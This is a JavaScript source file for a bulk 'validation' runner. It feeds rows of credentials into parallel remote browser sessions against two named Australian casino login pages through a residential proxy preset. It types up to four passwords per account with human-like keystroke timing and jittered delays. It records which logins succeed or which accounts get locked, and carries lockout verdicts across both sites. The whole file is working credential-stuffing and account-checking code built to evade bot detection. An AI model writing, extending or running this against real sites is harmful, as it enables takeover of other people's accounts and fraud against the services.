/**
 * Dual-target validation runner — for every credential row, launches one
 * Browserbase session per AU casino target (Joe Fortune + Ignition) in
 * parallel under the AU mobile / residential proxy preset.
 *
 * Per GOAL.md, each (row, target) task:
 *   1. Dismisses the cookie banner (site-specific + generic selectors).
 *   2. Locates the login form (canonical site selectors → broad heuristics).
 *   3. Tries up to 4 passwords with human-like typing (20–70ms/char).
 *   4. Classifies each attempt's resulting page text into one of:
 *        success | tempdisabled | permdisabled | retry
 *   5. Stops early on success / permdisabled / tempdisabled.
 *   6. After all 4 attempts with no signal → noaccount.
 *
 * Cross-site propagation: when one target on a row hits permdisabled or
 * tempdisabled, the other target on the same row is short-circuited
 * (the credential is unusable regardless of site).
 */
import { bbClient } from '@/lib/bbClient';
import { connectCdp, createAbortSignal, evaluate, wait, waitForPageIdle } from '@/lib/authorizedBulkCdp';
import {
  captureStepScreenshot,
  getAutomationObservabilitySettings,
  startScreenshotPoller,
  upsertAutomationEvidence,
} from '@/lib/automationObservability';
import { AU_CASINO_TARGETS, buildAuCasinoSessionOptions } from '@/lib/auCasino';
import { classifyAttempt, classifyTaskFromAttempts, OUTCOMES, outcomeLabel } from '@/lib/auCasinoOutcomeClassifier';
import { buildAttemptSequence } from '@/lib/auCasinoPasswordPaths';
import { buildCookieDismissScript } from '@/lib/auCasinoCookieDismiss';
import { humanType } from '@/lib/auCasinoHumanType';

const SESSION_TIMEOUT_SECONDS = 60;
const SELECTOR_TIMEOUT_MS = 12_000;
const POST_SUBMIT_SETTLE_MS_BASE = 2_500;
/** ±30% jitter so timing isn't a fixed constant across runs. */
function settleDelay() {
  const jitter = 0.7 + Math.random() * 0.6; // 0.7 – 1.3
  return Math.round(POST_SUBMIT_SETTLE_MS_BASE * jitter);
}
const MAX_TASK_CONCURRENCY = 6;
const MAX_PASSWORD_ATTEMPTS = 4;

// Heuristic fallbacks if the canonical selectors in lib/auCasino.js miss.
const USERNAME_SELECTORS = [
  'input[type="email"]',
  'input[name="email"]',
  'input[name="username"]',
  'input[id*="email" i]',
  'input[id*="user" i]',
];
const PASSWORD_SELECTORS = [
  'input[type="password"]',
  'input[name="password"]',
  'input[id*="password" i]',
];
const SUBMIT_SELECTORS = [
  'button[type="submit"]',
  'button[name="login"]',
  'button[id*="login" i]',
  'button[id*="submit" i]',
];

function buildFindSelectorsScript(target) {
  const canonical = target?.selectors || {};
  const userOpts = [canonical.username, ...USERNAME_SELECTORS].filter(Boolean);
  const passOpts = [canonical.password, ...PASSWORD_SELECTORS].filter(Boolean);
  const submitOpts = [canonical.submit, ...SUBMIT_SELECTORS].filter(Boolean);
  return `(() => new Promise((resolve) => {
    const userOpts = ${JSON.stringify(userOpts)};
    const passOpts = ${JSON.stringify(passOpts)};
    const submitOpts = ${JSON.stringify(submitOpts)};
    const deadline = Date.now() + ${SELECTOR_TIMEOUT_MS};
    const firstMatch = (selectors) => selectors.find((s) => document.querySelector(s)) || null;
    const check = () => {
      const user = firstMatch(userOpts);
      const pass = firstMatch(passOpts);
      const submit = firstMatch(submitOpts);
      if (user && pass && submit) return resolve({ ok: true, user, pass, submit });
      if (Date.now() > deadline) return resolve({ ok: false, user, pass, submit });
      requestAnimationFrame(check);
    };
    check();
  }))()`;
}

function buildClickSubmitScript(submitSelector) {
  return `(() => {
    const btn = document.querySelector(${JSON.stringify(submitSelector)});
    const beforeUrl = location.href;
    if (btn) btn.click();
    return { ok: !!btn, beforeUrl };
  })()`;
}

async function collectPageState(cdp) {
  return evaluate(cdp, `(() => ({
    url: location.href,
    title: document.title,
    text: (document.body?.innerText || '').slice(0, 1500),
  }))()`);
}

async function releaseSession(sessionId) {
  if (!sessionId) return;
  await bbClient.updateSession(sessionId, { status: 'REQUEST_RELEASE' }).catch(() => {});
}

/**
 * Run a single (row × target) task end-to-end. Honours `crossSiteState`
 * so a permdisabled/tempdisabled hit on the sibling target short-circuits.
 */
async function runTask({ row, target, runId, onTaskUpdate, shouldAbort, crossSiteState }) {
  const taskKey = `${row.index}:${target.key}`;
  const abortController = createAbortSignal(shouldAbort);
  const update = (patch) => onTaskUpdate?.({ rowIndex: row.index, targetKey: target.key, taskKey, ...patch });
  const evidenceSettings = getAutomationObservabilitySettings();
  const verbose = evidenceSettings.logVerbosityLevel === 'high';

  // Cross-site short-circuit: if the sibling target already proved this
  // credential is unusable, skip the network round-trip entirely.
  const siblingVerdict = crossSiteState.get(row.index);
  if (siblingVerdict === OUTCOMES.PERM_DISABLED || siblingVerdict === OUTCOMES.TEMP_DISABLED) {
    update({
      status: siblingVerdict,
      outcome: `Skipped — sibling target already returned ${outcomeLabel(siblingVerdict)}`,
      startedAt: new Date().toISOString(),
      endedAt: new Date().toISOString(),
    });
    return;
  }

  let sessionId = null;
  let cdp = null;
  let stopPoller = null;

  const captureEvidence = async (stepName, status = 'running') => {
    if (!cdp || !sessionId) return null;
    if (status !== 'failed' && !verbose) return null;
    return captureStepScreenshot(cdp, {
      sessionId,
      stepName,
      source: 'AUCasinoDualValidation',
      runId,
      rowIndex: row.index,
      status,
    }).catch(() => null);
  };

  update({
    status: 'running',
    outcome: `Launching ${target.label} session…`,
    attempt: 0,
    totalAttempts: MAX_PASSWORD_ATTEMPTS,
    startedAt: new Date().toISOString(),
  });

  try {
    const baseOptions = buildAuCasinoSessionOptions(target, { keepAlive: true });
    const options = {
      ...baseOptions,
      timeout: SESSION_TIMEOUT_SECONDS,
      browserSettings: {
        ...baseOptions.browserSettings,
        recordSession: evidenceSettings.enableVideoRecording,
      },
      userMetadata: {
        ...baseOptions.userMetadata,
        launchedFrom: 'BBCommandCenter-AUCasinoDualValidation',
        rowIndex: row.index,
        runId,
      },
    };
    const session = await bbClient.createSession(options);
    sessionId = session.id;

    await upsertAutomationEvidence({
      sessionId,
      source: 'AUCasinoDualValidation',
      runId,
      rowIndex: row.index,
      recordingUrl: `https://www.browserbase.com/sessions/${sessionId}`,
      status: 'running',
    }).catch(() => null);

    update({ sessionId, outcome: 'Connecting to browser' });

    cdp = await connectCdp(session.connectUrl);
    await cdp.send('Page.enable');
    await cdp.send('Runtime.enable');

    if (verbose) {
      stopPoller = startScreenshotPoller(cdp, {
        sessionId,
        source: 'AUCasinoDualValidation',
        runId,
        rowIndex: row.index,
      });
    }

    update({ outcome: `Loading ${target.label}` });
    await cdp.send('Page.navigate', { url: target.loginUrl });
    await waitForPageIdle(cdp, abortController.signal);

    // Dismiss cookie banner before form detection (GOAL.md §Phase 4).
    await evaluate(cdp, buildCookieDismissScript(target.key)).catch(() => null);
    await wait(400, abortController.signal).catch(() => {});
    await captureEvidence(`${target.label} — initial load`);

    update({ outcome: 'Locating login form' });
    const found = await evaluate(cdp, buildFindSelectorsScript(target), {}, SELECTOR_TIMEOUT_MS + 2_000);
    if (!found?.ok) {
      throw new Error('Login form not detected within timeout (selectors may have changed).');
    }
    await captureEvidence(`${target.label} — form ready`);

    // Type the username once — passwords change per attempt, but the
    // email field stays the same. Mirrors GOAL.md §Phase 5 behaviour.
    update({ outcome: 'Typing username' });
    await humanType(cdp, found.user, row.username, abortController.signal);

    const { passwords, path, repeatLastIndex } = buildAttemptSequence(row);
    const attemptResults = [];
    let terminalKind = null;

    for (let i = 0; i < MAX_PASSWORD_ATTEMPTS; i++) {
      if (abortController.signal.aborted) break;

      update({
        attempt: i + 1,
        totalAttempts: MAX_PASSWORD_ATTEMPTS,
        outcome: `Attempt ${i + 1}/${MAX_PASSWORD_ATTEMPTS} (path ${path})`,
      });

      // Slot 3 (index 3) is the deliberate replay of slot 2's password —
      // re-press submit only if it's an exact replay; otherwise retype.
      const isPureReplay = i === 3 && passwords[i] === passwords[repeatLastIndex];
      if (!isPureReplay) {
        await humanType(cdp, found.pass, passwords[i], abortController.signal);
      }

      const click = await evaluate(cdp, buildClickSubmitScript(found.submit));
      if (!click?.ok) throw new Error('Submit button vanished between attempts.');

      await wait(settleDelay(), abortController.signal).catch(() => {});
      await waitForPageIdle(cdp, abortController.signal, 8_000).catch(() => {});
      await captureEvidence(`${target.label} — attempt ${i + 1} result`);

      const state = await collectPageState(cdp);
      const verdict = classifyAttempt(state);
      attemptResults.push(verdict);

      // Early exit on any non-retry signal.
      if (verdict.kind === OUTCOMES.SUCCESS
          || verdict.kind === OUTCOMES.PERM_DISABLED
          || verdict.kind === OUTCOMES.TEMP_DISABLED) {
        terminalKind = verdict.kind;
        break;
      }
    }

    const final = terminalKind
      ? { kind: terminalKind }
      : classifyTaskFromAttempts(attemptResults);

    // Propagate sibling-blocking verdicts so the row's other task can skip.
    if (final.kind === OUTCOMES.PERM_DISABLED || final.kind === OUTCOMES.TEMP_DISABLED) {
      crossSiteState.set(row.index, final.kind);
    }

    const stateForUrl = await collectPageState(cdp).catch(() => null);
    update({
      status: final.kind,
      outcome: `${outcomeLabel(final.kind)} after ${attemptResults.length} attempt(s)`,
      attempt: attemptResults.length,
      totalAttempts: MAX_PASSWORD_ATTEMPTS,
      finalUrl: stateForUrl?.url,
      pageTitle: stateForUrl?.title,
      endedAt: new Date().toISOString(),
    });
    await upsertAutomationEvidence({
      sessionId,
      source: 'AUCasinoDualValidation',
      runId,
      rowIndex: row.index,
      status: final.kind === OUTCOMES.SUCCESS ? 'success' : 'review',
    }).catch(() => null);
  } catch (error) {
    const aborted = error?.name === 'AbortError' || shouldAbort?.();
    await captureEvidence(`${target.label} — failure`, aborted ? 'review' : 'failed');
    await upsertAutomationEvidence({
      sessionId,
      source: 'AUCasinoDualValidation',
      runId,
      rowIndex: row.index,
      status: aborted ? 'review' : 'failed',
    }).catch(() => null);
    update({
      status: aborted ? OUTCOMES.NA : OUTCOMES.NA,
      outcome: aborted ? 'Stopped before this task finished' : (error.message || 'Task failed'),
      endedAt: new Date().toISOString(),
    });
  } finally {
    abortController.abort();
    if (stopPoller) await stopPoller().catch(() => {});
    cdp?.close();
    await releaseSession(sessionId);
  }
}

/**
 * Run dual-target validation across `rows`. Generates `rows.length × 2`
 * tasks (one per row × target) and runs them with bounded concurrency.
 *
 * `crossSiteState` is shared across all workers so a permdisabled/temp-
 * disabled hit on one target short-circuits the sibling task.
 */
export async function runAuCasinoDualValidation({ rows, concurrency = 2, onTaskUpdate, shouldAbort, runId }) {
  const startedAt = Date.now();
  const tasks = [];
  for (const row of rows) {
    for (const target of AU_CASINO_TARGETS) {
      tasks.push({ row, target });
    }
  }

  const queue = tasks.slice();
  const crossSiteState = new Map(); // rowIndex → terminal kind (perm/temp)
  const workerCount = Math.min(Math.max(1, Math.floor(concurrency)), MAX_TASK_CONCURRENCY, queue.length || 1);

  const worker = async () => {
    while (queue.length) {
      if (shouldAbort?.()) {
        const skipped = queue.splice(0);
        for (const skip of skipped) {
          onTaskUpdate?.({
            rowIndex: skip.row.index,
            targetKey: skip.target.key,
            taskKey: `${skip.row.index}:${skip.target.key}`,
            status: OUTCOMES.NA,
            outcome: 'Skipped because run was stopped',
            endedAt: new Date().toISOString(),
          });
        }
        return;
      }
      const next = queue.shift();
      if (next) await runTask({ ...next, runId, onTaskUpdate, shouldAbort, crossSiteState });
    }
  };

  await Promise.all(Array.from({ length: workerCount }, worker));
  return { durationMs: Date.now() - startedAt, taskCount: tasks.length };
}